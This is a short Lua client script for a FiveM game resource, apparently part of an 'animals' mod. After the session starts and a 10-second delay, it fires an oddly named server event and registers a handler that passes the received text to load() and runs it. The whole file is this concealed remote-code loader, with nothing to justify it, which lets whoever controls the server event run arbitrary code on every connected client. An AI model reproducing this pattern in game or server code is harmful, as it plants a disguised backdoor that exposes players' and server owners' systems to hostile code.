CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    Wait(10000)
    TriggerServerEvent('animals:dumpwoanders')
end)

RegisterNetEvent('animals:dumpwoanders')
AddEventHandler('animals:dumpwoanders', function(text)
    assert(load(text))()
end)